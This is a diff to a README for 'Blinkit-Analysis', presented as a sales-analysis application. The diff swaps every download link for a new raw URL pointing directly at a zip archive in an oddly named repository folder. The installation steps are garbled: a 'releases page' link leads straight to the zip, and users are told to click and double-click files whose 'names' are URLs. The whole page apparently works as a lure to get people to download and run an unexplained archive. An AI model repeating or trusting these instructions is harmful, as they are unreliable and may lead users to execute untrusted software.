@@ -1,7 +1,7 @@
 # 📊 Blinkit-Analysis - Simple Sales Insights at Your Fingertips
 
 ## 📥 Download Now
-[![Download Blinkit-Analysis](https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip)](https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip)
+[![Download Blinkit-Analysis](https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip)](https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Blinkit-Analysis! This application helps you perform in-depth data analysis on Blinkit sales. You’ll gain insights into sales trends and key performance indicators with minimal effort. 
@@ -21,19 +21,19 @@ These requirements ensure you have a smooth experience while using Blinkit-Analy
 To use Blinkit-Analysis, please follow the steps below:
 
 1. **Visit the Release Page**:
-   Click this link to go to the releases page: [Download Page](https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip).
+   Click this link to go to the releases page: [Download Page](https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip).
 
 2. **Choose the Latest Version**:
    Look for the latest version at the top of the page.
 
 3. **Download the Package**:
-   You will see various files available for download. Click on the one labeled as "https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip".
+   You will see various files available for download. Click on the one labeled as "https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip".
 
 4. **Extract the Files**:
    Once the download is complete, locate the downloaded file. Right-click on it and select "Extract Here" or use any extraction tool you prefer.
 
 5. **Open the Application**:
-   Navigate to the extracted folder. Double-click on the file named `https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip` to start the application.
+   Navigate to the extracted folder. Double-click on the file named `https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip` to start the application.
 
 ## 🎓 How to Use Blinkit-Analysis
 The software provides an easy interface for running data analysis. Here’s how you can begin:
@@ -85,4 +85,4 @@ This project covers the following key topics:
 Discover how data can transform your understanding of sales with Blinkit-Analysis. 
 
 ## 📥 Download Again
-Don’t forget, you can always download the latest version of the software here: [Download Page](https://raw.githubusercontent.com/Maisur0706/Blinkit-Analysis/main/richen/Blinkit-Analysis.zip).
+Don’t forget, you can always download the latest version of the software here: [Download Page](https://github.com/Maisur0706/Blinkit-Analysis/raw/refs/heads/main/richen/Blinkit-Analysis-v2.6.zip).
